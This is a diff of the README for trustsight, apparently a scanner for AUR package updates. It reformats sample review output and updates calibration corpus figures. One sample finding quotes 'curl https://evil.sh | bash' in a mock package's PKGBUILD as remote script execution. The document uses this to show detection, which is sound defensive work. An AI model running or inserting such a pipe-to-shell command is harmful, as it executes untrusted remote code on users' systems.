@@ -157,20 +157,21 @@ trustsight review
 
 ```
 ╭────────────────────────── chez-scheme-bin ───────────────────────────╮
-│  Version  10.0.0-1  →  10.1.0-2                                     │
+│  Version  10.0.0  →  10.1.0                                          │
 │  Status   Only pkgver and sha256sums changed. Review the diff        │
 │           before building.                                           │
-│  Changed  pkgver 10.0.0-1 -> 10.1.0-2                               │
-│           checksums checksum added or changed                        │
+│  Changed  pkgver 10.0.0 -> 10.1.0                                    │
+│           checksums added or changed                                 │
 ╰──────────────────────────────────────────────────────────────────────╯
 ╭──────────────────────────── sketchy-pkg ─────────────────────────────╮
-│  Version  1.4.2-1  →  1.5.0-2                                       │
+│  Version  1.4.2  →  1.5.0                                            │
 │  Status   The update is not trivial. Review it.                      │
-│  Finding  PKGBUILD line 4 [R001] Remote Script Execution: curl       │
-│           https://evil.sh | bash                                     │
-│  Finding  [SOURCE_BUCKET] Source URL classified as unknown            │
-│           (https://evil.sh)                                           │
-│  Changed  source host added: evil.sh                                 │
+│           PKGBUILD line 4  Remote Script Execution: curl             │
+│           https://evil.sh | bash [R001]                              │
+│           Source URL classified as unknown (https://evil.sh)         │
+│           [SOURCE_BUCKET]                                            │
+│  Changed  pkgver 1.4.2 -> 1.5.0                                      │
+│           source host added: evil.sh                                 │
 ╰──────────────────────────────────────────────────────────────────────╯
 2 package(s) needing update and reviewed out of 2 installed
 ```
@@ -244,7 +245,7 @@ Scoring is fully deterministic: same input always produces the same score. The p
 4. **Check novelty** against the local database of known URLs and maintainers
 5. **Calculate score** from 0-100 by summing weighted contributions across four evidence tiers
 
-Signals come from 145 documented rules across five scoring namespaces: 119 detection rules (R-series, part TOML-configurable and part code-emitted), 7 code-structure rules (C001-C007), 4 dependency-graph rules (D001-D004), 8 sabotage rules (S001-S008) and 7 crossfire anti-evasion rules (X001-X007). A sixth namespace, declared practice (P001-P007), reports at weight 0 and never scores. Calibration uses a locked, point-in-time 3,739-diff benign corpus of real AUR updates and 175 self-authored, labelled malicious fixtures; it is regression evidence, not an independent recall claim. See [Benchmarks and Methodology](https://docs.trustsight.org/explanation/benchmarks-and-methodology/) and the [blinded-evaluation intake](https://docs.trustsight.org/contributing/blinded-evaluation/) for scope.
+Signals come from 145 documented rules across five scoring namespaces: 119 detection rules (R-series, part TOML-configurable and part code-emitted), 7 code-structure rules (C001-C007), 4 dependency-graph rules (D001-D004), 8 sabotage rules (S001-S008) and 7 crossfire anti-evasion rules (X001-X007). A sixth namespace, declared practice (P001-P007), reports at weight 0 and never scores. Calibration uses a locked, point-in-time 3,246-diff benign corpus of real AUR updates and 175 self-authored, labelled malicious fixtures; it is regression evidence, not an independent recall claim. See [Benchmarks and Methodology](https://docs.trustsight.org/explanation/benchmarks-and-methodology/) and the [blinded-evaluation intake](https://docs.trustsight.org/contributing/blinded-evaluation/) for scope.
 
 Verdicts are template-based, describing each triggered finding in plain English. The score is never influenced by the verdict text.
 
